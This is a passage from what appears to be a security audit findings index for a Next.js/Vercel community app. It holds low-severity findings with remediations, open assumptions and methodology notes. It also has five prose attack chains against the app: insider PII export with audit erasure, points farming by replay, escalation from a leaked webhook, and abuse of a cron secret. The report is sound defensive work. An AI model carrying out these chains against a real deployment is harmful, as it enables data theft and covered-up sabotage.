If the app calls `track({ user_email })` (Vercel Analytics custom property), it ships PII to Vercel's analytics DB. **Remediation:** Use hashed user-id; never raw email.

---

### F-126: Plaintext offline IndexedDB data not wiped when consent withdrawn

**Severity:** Info | **CWE:** CWE-359 | **Cat refs:** Cat 15, Cat 27
**Location:** [lib/offlineStorage.ts](../../lib/offlineStorage.ts)

On consent-withdrawal or logout, IndexedDB is not cleared; PII in cached actions persists on the device. **Remediation:** On logout, call `indexedDB.deleteDatabase('team1india-offline')`.

---

### F-127: Cron schedule trigger discoverable via `vercel.json` exposure

**Severity:** Info | **CWE:** CWE-200 | **Cat refs:** Cat 17, Cat 26
**Location:** [vercel.json](../../vercel.json)

Cron paths are public knowledge (in committed vercel.json). Slightly aids brute-force on F-003 (cron secret). **Remediation:** N/A — Vercel requires paths be in vercel.json. Compensate by strengthening cron auth (F-003).

---

### F-128: Source maps not generated in production (good)

**Severity:** Info | **CWE:** CWE-540 | **Cat refs:** Cat 9, Cat 16, Cat 26
**Location:** [next.config.ts](../../next.config.ts)

`productionBrowserSourceMaps` is not set (defaults to false). Confirm continued. **Remediation:** None; add a CI assertion `productionBrowserSourceMaps !== true` to prevent regression.

---

### F-129: Sentry DSN exposed in client (acceptable per Sentry design)

**Severity:** Info | **CWE:** CWE-200 | **Cat refs:** Cat 25
**Location:** client bundle

DSN is a public identifier by design; the only risk is quota-exhaustion via fake events (mitigated by Sentry's per-DSN rate limit). However, per F-034, Sentry is dormant — so the DSN exposure is *purely* signaling without monitoring benefit. **Remediation:** Either initialize Sentry (resolves F-034) or remove the env var.

---

### F-130: NEXT_PUBLIC_ADMIN_EMAIL / NEXT_PUBLIC_ADMIN_EMAIL_ENDPOINT exposed

**Severity:** Info | **CWE:** CWE-200 | **Cat refs:** Cat 16
**Location:** client bundle

Admin email + admin endpoint URL in bundle. Phishing attackers learn who to target and where the admin endpoint lives. Low impact but easily avoidable. **Remediation:** Move to server-only env vars; expose only via server-rendered pages where needed.

---

### F-131: OAuth domain-based auto-promotion not implemented (good — confirmed)

**Severity:** Info | **CWE:** — | **Cat refs:** Cat 3
**Location:** [lib/auth-options.ts](../../lib/auth-options.ts)

Common foot-gun: auto-grant admin to `@company.com` emails. Confirmed *not* present — defaults to PUBLIC tier. **Remediation:** None; codify the absence with a regression test.

---

### F-132: Background job inheriting elevated permissions (system role)

**Severity:** Info | **CWE:** CWE-269 | **Cat refs:** Cat 2, Cat 3
**Location:** [app/api/cron/](../../app/api/cron/)

Cron handlers run as a system actor with full DB access — design intent. Re-stated for completeness; the security boundary here is `CRON_SECRET` (F-003) and AuditLog (F-013). **Remediation:** Treat cron secret rotation and per-job AuditLog as mitigations (chained).

---

## Cross-References & Attack Chains

The following chains compound multiple findings into more severe outcomes. Phase 3 (Matrices) treats these as primary attack paths.

**Chain A — Insider exfil with cover-up:**
F-004 (30d JWT) → F-011 (cached permission grant) → F-012 (single-admin) → F-016/F-017 (PII export) → F-013 (audit erasure) → F-029 (no admin-read audit). Net: any FULL_ACCESS admin, even after revocation, can dump the user table and erase all evidence.

**Chain B — Public PWA replay farming:**
F-005 (no server idempotency) + F-009 (quest race) + F-023 (swag race) + F-022 (no input bounds) + F-025 (no rate limit) + F-092 (no wallet AuditLog). Net: a single member account farms unlimited points/swag undetected.

**Chain C — Webhook → spear-phish → admin compromise:**
F-001 (Slack webhook leak) → impersonate platform-alert message in admin Slack → admin clicks → F-032/F-008 (XSS) → F-011/F-012 (escalate) → F-013 (cover up).

**Chain D — Preview-deploy total compromise:**
F-014/F-045 (preview shares prod env) → contributor pushes a `/api/dump` route → exfil DB + secrets → forge JWT → F-004/F-011 path or direct DB write.

**Chain E — Cron-secret leak → economy collapse:**
F-003 (single CRON_SECRET) leaks (Vercel log, dev laptop) → attacker hits `/api/cron/expire-points` repeatedly → F-010 (no cron idempotency) → all points expired → F-028 (no anomaly alert) → discovered only after user complaints.

---

## Open Assumptions (8)

These items could not be verified from source alone and require runtime / Vercel-UI / DB-shell access to confirm:

| OA# | Description | Mapped findings | Risk if confirmed |
|---|---|---|---|
| OA-1 | NEXTAUTH_SECRET shared between preview and prod | F-014, F-045 | Critical |
| OA-2 | DATABASE_URL shared between preview and prod | F-014, F-045 | Critical |
| OA-3 | Postgres user is `postgres` superuser (not least-priv) | (Cat 23) | Medium |
| OA-4 | Backup snapshots accessible without further auth | (Cat 23) | Medium-High |
| OA-5 | Postgres replicas/read-replicas publicly reachable | (Cat 23) | Medium |
| OA-6 | Cron schedule actually runs (not paused at Vercel) | F-035 | Variable |
| OA-7 | Vercel CDN cache key includes per-user-variant correctly | F-038 | Medium |
| OA-8 | Postgres data-residency region | (Cat 27) | Regulatory |

---

## Categories with N/A Verdicts (no findings raised)

| Category | Reason |
|---|---|
| Cat 8 — Multi-tenant | Single-tenant architecture; tenant model does not exist |
| Cat 8 sub-checks for tenant cache, search-index, RLS-tenants | N/A |
| Cat 14 (most checks) | No raw SQL, no unsafe deserialization, no SSTI in main paths (CLEAR) |
| Cat 18 (most checks) | No webhook delivery to user URLs; no PDF/image fetcher; no OAuth issuer injection |
| Cat 19 (most checks) | Vercel Blob isolated, Cloudinary signed, blob cleanup correct |
| Cat 29 (many checks) | No SAML, no impersonation, no LLM, no ANSI/Bidi exposure, no /tmp |

---

## Methodology Notes

- All `File:line` links resolve relative to the repo root; check `../../` paths from this document.
- CVSS scores are estimates based on the available code; environmental scores depend on real-world configuration (e.g., MFA enrollment rate).
- "Confirmed" / "Suspected" / "Open Assumption" tags from per-category scans were normalized into severity bands here.
- Where two cross-category findings have the same root cause, the canonical entry lives at the lowest finding ID; later category re-statements appear as Cat refs only (no separate entry).
- Severity bands follow OWASP Risk Rating: Critical = direct system compromise / unauthenticated impact; High = significant impact requiring some auth/precondition; Medium = scoped data/integrity impact or security weakness; Low = quality/hardening gap; Info = factual observation, no immediate exploit path.

---

**End of Phase 2 — Findings Index. Next: [03-MATRICES.md](03-MATRICES.md) for cross-cutting matrices and [04-EXEC-SUMMARY.md](04-EXEC-SUMMARY.md) for the executive synthesis.**

